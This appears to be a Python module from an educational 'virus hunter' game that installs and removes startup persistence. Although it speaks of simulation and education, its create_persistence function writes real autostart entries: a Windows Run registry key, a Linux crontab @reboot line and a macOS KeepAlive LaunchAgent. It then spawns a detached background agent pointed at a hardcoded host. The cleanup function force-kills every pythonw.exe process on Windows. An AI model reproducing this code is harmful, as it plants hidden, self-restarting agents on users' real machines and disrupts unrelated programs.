import os
import sys
import subprocess
from pathlib import Path
from typing import Tuple

SIMULATED_STARTUP_DIR = Path(__file__).resolve().parent / "simulated_startup"
PERSISTENCE_MARKER = SIMULATED_STARTUP_DIR / "system_defender_autorun.txt"

def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]:
    """Create a persistent background process using platform-specific methods."""
    SIMULATED_STARTUP_DIR.mkdir(parents=True, exist_ok=True)
    
    is_frozen = getattr(sys, 'frozen', False)
    if is_frozen:
        exe_path = os.path.abspath(sys.executable)
    else:
        # Absolute path to python and the main script
        exe_path = f'"{sys.executable}" "{Path(__file__).resolve().parent.parent / "game" / "main_game.py"}"'
    
    # Platform-specific command for the agent
    agent_cmd = f'{exe_path} --bg --host {host}'
    
    # 1. Windows: Registry Run Key
    if sys.platform == "win32":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "VirusHunterAgent", 0, winreg.REG_SZ, agent_cmd)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Windows Registry Error: {e}")

    # 2. Linux: Crontab @reboot
    elif sys.platform.startswith("linux"):
        try:
            # Add @reboot entry if it doesn't exist
            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {agent_cmd}") | crontab -'
            subprocess.run(cron_cmd, shell=True)
        except Exception as e:
            print(f"Linux Crontab Error: {e}")

    # 3. macOS: LaunchAgent (plist)
    elif sys.platform == "darwin":
        try:
            label = "com.v-hunter.agent"
            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{label}.plist"
            plist_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Simple plist content
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable if is_frozen else sys.executable}</string>
        {"<string>" + (Path(__file__).resolve().parent.parent / "game" / "main_game.py").as_posix() + "</string>" if not is_frozen else ""}
        <string>--bg</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path.write_text(plist_content.strip())
            # Load it immediately
            subprocess.run(["launchctl", "load", str(plist_path)], capture_output=True)
        except Exception as e:
            print(f"macOS LaunchAgent Error: {e}")

    # Write marker for education
    PERSISTENCE_MARKER.write_text(f"Persistence active on {sys.platform}\nTarget: {agent_cmd}\n")

    # Spawn immediate detached background process
    try:
        cmd_args = [sys.executable] if is_frozen else [sys.executable, "-m", "game.main_game"]
        cmd_args.append("--bg")
        
        if sys.platform == "win32":
            subprocess.Popen(cmd_args, creationflags=0x00000008 | 0x00000200, close_fds=True)
        else:
            subprocess.Popen(cmd_args, start_new_session=True)
        return True, PERSISTENCE_MARKER
    except Exception as e:
        print(f"Immediate Launch Error: {e}")
        return False, PERSISTENCE_MARKER

def remove_persistence() -> Tuple[bool, Path]:
    """Remove all persistence markers and entries."""
    # 1. Windows Cleanup
    if sys.platform == "win32":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "VirusHunterAgent")
            winreg.CloseKey(key)
        except: pass
        subprocess.run(["taskkill", "/F", "/IM", "VirusHunter.exe"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        subprocess.run(["taskkill", "/F", "/IM", "pythonw.exe"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    # 2. Linux Cleanup
    elif sys.platform.startswith("linux"):
        try:
            subprocess.run("crontab -l | grep -v 'game/main_game.py' | crontab -", shell=True)
            subprocess.run(["pkill", "-f", "main_game.py"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except: pass

    # 3. macOS Cleanup
    elif sys.platform == "darwin":
        try:
            label = "com.v-hunter.agent"
            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{label}.plist"
            subprocess.run(["launchctl", "unload", str(plist_path)], capture_output=True)
            if plist_path.exists(): plist_path.unlink()
            subprocess.run(["pkill", "-f", "main_game.py"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except: pass

    if PERSISTENCE_MARKER.exists():
        PERSISTENCE_MARKER.unlink()
    return True, PERSISTENCE_MARKER

